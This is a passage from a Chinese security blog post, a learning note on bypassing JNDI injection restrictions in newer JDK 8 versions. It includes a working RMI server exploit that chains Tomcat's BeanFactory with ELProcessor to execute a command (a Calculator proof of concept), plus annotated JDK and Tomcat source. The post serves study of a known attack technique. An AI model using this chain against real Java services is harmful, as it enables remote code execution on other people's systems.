@@ -1,0 +1,1455 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="JNDI RMI">
+    <meta name="description" content="">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>高版本 JDK RMI JNDI Bypass 学习笔记 | Hexo</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">有关部门临时工</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Hexo</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/LinShiG0ng" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/LinShiG0ng" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('http://pic.netbian.com/uploads/allimg/171005/112246-1507173766a5ea.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">高版本 JDK RMI JNDI Bypass 学习笔记</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        height: calc(100vh - 250px);
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    .toc-fixed .toc-link::before{
+        position: fixed!important;/*当toc的位置改为fixed时，.toc-link::before也要改为fixed*/
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #toc-content .is-active-link::before {
+        background-color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">
+                                <span class="chip bg-color">漏洞利用</span>
+                            </a>
+                        
+                            <a href="/tags/RMI/">
+                                <span class="chip bg-color">RMI</span>
+                            </a>
+                        
+                            <a href="/tags/JNDI/">
+                                <span class="chip bg-color">JNDI</span>
+                            </a>
+                        
+                            <a href="/tags/RPC/">
+                                <span class="chip bg-color">RPC</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2020-09-23
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
+                    2020-09-29
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    2.8k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    12 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="高版本-JDK-RMI-JNDI-Bypass-学习笔记"><a href="#高版本-JDK-RMI-JNDI-Bypass-学习笔记" class="headerlink" title="高版本 JDK RMI JNDI Bypass 学习笔记"></a>高版本 JDK RMI JNDI Bypass 学习笔记</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>此片文章我们以jdk 1.8为例进行介绍</p>
+<p>众所周知，Oracle在jdk 8u121 版本中添加了 JEP290 以及对<code>com.sun.jndi.rmi.object.trustURLCodebase</code>的校验</p>
+<p> 然后又在以及8u 191这个版本中添加了针对<code>com.sun.jndi.ldap.object.trustURLCodebase</code>属性的校验，导致在高版本JDK中 无法通过 反序列化  <code>rmi reference</code>  和<code>ldap Reference</code>来进行RCE攻击</p>
+<p>所以如果目标服务器上使用的是高版本JDK，且存在有JDNI注入等RCE的点，那我们想要利用成功就必须要绕过以上的种种限制</p>
+<h2 id="绕过姿势1"><a href="#绕过姿势1" class="headerlink" title="绕过姿势1"></a>绕过姿势1</h2><p>首先是来自一个国外大佬提供的思路，该姿势的核心思想就是在本地查找可利用的<code>ObjectFactory</code>。</p>
+<p>先粘贴下服务端的代码</p>
+<pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RMIProvider5</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> RemoteException<span class="token punctuation">,</span> AlreadyBoundException<span class="token punctuation">,</span> NamingException <span class="token punctuation">{</span>
+        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Creating evil RMI registry on port 1099"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        Registry registry <span class="token operator">=</span> LocateRegistry<span class="token punctuation">.</span><span class="token function">getRegistry</span><span class="token punctuation">(</span><span class="token number">1099</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token comment" spellcheck="true">//prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory</span>
+      <span class="token comment" spellcheck="true">//这里使用了ResourceRef，ResourceRef是Reference的子类</span>
+        ResourceRef ref <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResourceRef</span><span class="token punctuation">(</span><span class="token string">"javax.el.ELProcessor"</span><span class="token punctuation">,</span> null<span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span><span class="token string">"org.apache.naming.factory.BeanFactory"</span><span class="token punctuation">,</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment" spellcheck="true">//redefine a setter name for the 'x' property from 'setX' to 'eval', see BeanFactory.getObjectInstance code</span>
+        ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"forceString"</span><span class="token punctuation">,</span> <span class="token string">"x=eval"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment" spellcheck="true">//expression language to execute 'nslookup jndi.s.artsploit.com', modify /bin/sh to cmd.exe if you target windows</span>
+        <span class="token comment" spellcheck="true">/**这里需要注意，由于jdk版本不同 在jdk 8u20版本进行测试的时候是会报错的，在jdk 8u121及其之后的版本测试是会成功的，主要原因出在NashornScriptEngine这个类上 具体报错是什么原因就不是很想深究了，也没什么深究的意义*/</span>
+        ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"x"</span><span class="token punctuation">,</span> <span class="token string">"\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['open','/Applications/Calculator.app']).start()\")"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        ReferenceWrapper referenceWrapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>ReferenceWrapper</span><span class="token punctuation">(</span>ref<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        registry<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"refObj"</span><span class="token punctuation">,</span> referenceWrapper<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span></code></pre>
+<p>在之前一片文章中有写过JNDI在处理<code>Reference</code>的时候会尝试先从本地加载传递来的<code>classFactory</code>，然后本地加载不到才会在通过<code>URLClassloader</code>去远程加载，但是不管这个类是本地加载的还是远程加载的都要符合一个关键条件就是要实现<code>javax.naming.spi.ObjectFactory</code>这个接口，下面说下原因</p>
+<pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//由于返回值必须是ObjectFactory类型，如果想要程序可以正常返回上一个方法并且可以不报错的继续执行，那我们就需要一个实现了ObjectFactory接口的类</span>
+<span class="token keyword">static</span> ObjectFactory <span class="token function">getObjectFactoryFromReference</span><span class="token punctuation">(</span>
+    Reference ref<span class="token punctuation">,</span> String factoryName<span class="token punctuation">)</span>
+    <span class="token keyword">throws</span> IllegalAccessException<span class="token punctuation">,</span>
+    InstantiationException<span class="token punctuation">,</span>
+    MalformedURLException <span class="token punctuation">{</span>
+    Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> clas <span class="token operator">=</span> null<span class="token punctuation">;</span>
+
+    <span class="token comment" spellcheck="true">// Try to use current class loader</span>
+    <span class="token keyword">try</span> <span class="token punctuation">{</span>
+          <span class="token comment" spellcheck="true">//这里会将通过Reference传递过来的classfactory先用AppClassloader从本地尝试加载一遍，这里也就是我们绕过高版本JDK限制的点</span>
+         clas <span class="token operator">=</span> helper<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>factoryName<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ClassNotFoundException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token comment" spellcheck="true">// ignore and continue</span>
+        <span class="token comment" spellcheck="true">// e.printStackTrace();</span>
+    <span class="token punctuation">}</span>
+    <span class="token comment" spellcheck="true">// All other exceptions are passed up.</span>
+
+    <span class="token comment" spellcheck="true">// Not in class path; try to use codebase</span>
+    String codebase<span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>clas <span class="token operator">==</span> null <span class="token operator">&amp;&amp;</span>
+            <span class="token punctuation">(</span>codebase <span class="token operator">=</span> ref<span class="token punctuation">.</span><span class="token function">getFactoryClassLocation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">try</span> <span class="token punctuation">{</span>
+          <span class="token comment" spellcheck="true">//这里是低版本通过rmi Reference 或者ldap远程加载恶意类的点，由于在JDK 8u191版本之后对</span>
+          <span class="token comment" spellcheck="true">//com.sun.jndi.ldap.object.trustURLCodebase</span>
+          <span class="token comment" spellcheck="true">//com.sun.jndi.rmi.object.trustURLCodebase</span>
+          <span class="token comment" spellcheck="true">//全部进行了校验所以该点已经基本不可利用了</span>
+          <span class="token comment" spellcheck="true">//不过在低版本中 这个远程加载的恶意类可以不实现ObjectFactory接口</span>
+          <span class="token comment" spellcheck="true">//因为恶意代码是写在了静态代码块中，只要类加载到了本地，静态代码块就会执行，</span>
+          <span class="token comment" spellcheck="true">//不过就是如果恶意类没有实现ObjectFactory接口，后续会抛出异常罢了，因为返回值类型不对么。</span>
+            clas <span class="token operator">=</span> helper<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>factoryName<span class="token punctuation">,</span> codebase<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ClassNotFoundException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">return</span> <span class="token punctuation">(</span>clas <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token punctuation">(</span>ObjectFactory<span class="token punctuation">)</span> clas<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">:</span> null<span class="token punctuation">;</span>
+<span class="token punctuation">}</span></code></pre>
+<p>现在我们清楚这个绕过姿势的核心思想，同样使用的是Reference对象，但是从之前的直接远程加载恶意类到本地变成了先从本地加载一个实现了<code>ObjectFactory</code>接口的类，这样就导致的一个问题，就是这种利用方式高度依赖于目标站点所依赖的jar包。</p>
+<p>我们可以看下<code>ObjectFactory</code>接口中都定义了哪些方法</p>
+<pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">ObjectFactory</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> Object <span class="token function">getObjectInstance</span><span class="token punctuation">(</span>Object obj<span class="token punctuation">,</span> Name name<span class="token punctuation">,</span> Context nameCtx<span class="token punctuation">,</span>
+                                    Hashtable<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token punctuation">,</span><span class="token operator">?</span><span class="token operator">></span> environment<span class="token punctuation">)</span>
+        <span class="token keyword">throws</span> Exception<span class="token punctuation">;</span>
+<span class="token punctuation">}</span></code></pre>
+<p>根据源码可以看到<code>ObjectFactory</code>内只定义了一个<code>getObjectInstance</code>方法</p>
+<p>这个方法很关键，为什么这样说我们返回到调用<code>getObjectFactoryFromReference</code>方法的地方去</p>
+<pre class=" language-java"><code class="language-java">factory <span class="token operator">=</span> <span class="token function">getObjectFactoryFromReference</span><span class="token punctuation">(</span>ref<span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span>factory <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+  <span class="token comment" spellcheck="true">//ref这个参数可控</span>
+    <span class="token keyword">return</span> factory<span class="token punctuation">.</span><span class="token function">getObjectInstance</span><span class="token punctuation">(</span>ref<span class="token punctuation">,</span> name<span class="token punctuation">,</span> nameCtx<span class="token punctuation">,</span>
+                                     environment<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span></code></pre>
+<p>可以看到程序会调用<code>ObjectFactory.getObjectInstance()</code>方法，也就是说我们只需要找到一个实现了<code>ObjectFactory</code>的类，且该类在<code>getObjectInstance</code>方法中对外部传入的参数进行也高危操作。</p>
+<p>顺着这个思路，就找到了这么一个类<code>org.apache.naming.factory.BeanFactory</code>该类存在于tomcat-catalina.jar包中，我们来看看这个<code>BeanFactory</code>中的<code>getObjectInstance</code>方法的部分实现</p>
+<pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> Object <span class="token function">getObjectInstance</span><span class="token punctuation">(</span>Object obj<span class="token punctuation">,</span> Name name<span class="token punctuation">,</span> Context nameCtx<span class="token punctuation">,</span>
+                                Hashtable<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token punctuation">,</span><span class="token operator">?</span><span class="token operator">></span> environment<span class="token punctuation">)</span>
+    <span class="token keyword">throws</span> NamingException <span class="token punctuation">{</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>obj <span class="token keyword">instanceof</span> <span class="token class-name">ResourceRef</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+
+        <span class="token keyword">try</span> <span class="token punctuation">{</span>
+            <span class="token comment" spellcheck="true">//将传入的object参数强转为Reference对象</span>
+            Reference ref <span class="token operator">=</span> <span class="token punctuation">(</span>Reference<span class="token punctuation">)</span> obj<span class="token punctuation">;</span>
+           <span class="token comment" spellcheck="true">//获取reference对像中的classname属性</span>
+            String beanClassName <span class="token operator">=</span> ref<span class="token punctuation">.</span><span class="token function">getClassName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> beanClass <span class="token operator">=</span> null<span class="token punctuation">;</span>
+              <span class="token comment" spellcheck="true">//获取当前上下文的Classloader，也就是AppClassLoader</span>
+            ClassLoader tcl <span class="token operator">=</span> 
+                Thread<span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getContextClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>tcl <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token keyword">try</span> <span class="token punctuation">{</span>
+                  <span class="token comment" spellcheck="true">//通过AppClassLoader加载reference对像中的classname属性中所存储的类对象</span>
+                    beanClass <span class="token operator">=</span> tcl<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>beanClassName<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">}</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>ClassNotFoundException e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token punctuation">}</span>
+            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+                <span class="token keyword">try</span> <span class="token punctuation">{</span>
+                    beanClass <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>beanClassName<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">}</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>ClassNotFoundException e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">}</span>
+            <span class="token punctuation">}</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>beanClass <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">NamingException</span>
+                    <span class="token punctuation">(</span><span class="token string">"Class not found: "</span> <span class="token operator">+</span> beanClassName<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+
+            BeanInfo bi <span class="token operator">=</span> Introspector<span class="token punctuation">.</span><span class="token function">getBeanInfo</span><span class="token punctuation">(</span>beanClass<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            PropertyDescriptor<span class="token punctuation">[</span><span class="token punctuation">]</span> pda <span class="token operator">=</span> bi<span class="token punctuation">.</span><span class="token function">getPropertyDescriptors</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token comment" spellcheck="true">//实例化该对象</span>
+            Object bean <span class="token operator">=</span> beanClass<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+                <span class="token comment" spellcheck="true">/* Look for properties with explicitly configured setter */</span>
+                      <span class="token comment" spellcheck="true">//获取ResourceRef.addr[]中addrType为forceString的addr</span>
+                RefAddr ra <span class="token operator">=</span> ref<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"forceString"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Method<span class="token operator">></span> forced <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Method<span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                String value<span class="token punctuation">;</span>
+
+                <span class="token keyword">if</span> <span class="token punctuation">(</span>ra <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                  <span class="token comment" spellcheck="true">//获取addrType为forceString的addr的contents，这里contes的值为</span>
+                  <span class="token comment" spellcheck="true">//"x=eval"</span>
+                    value <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span>ra<span class="token punctuation">.</span><span class="token function">getContent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> paramTypes<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+                    paramTypes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>
+                    String setterName<span class="token punctuation">;</span>
+                    <span class="token keyword">int</span> index<span class="token punctuation">;</span>
+
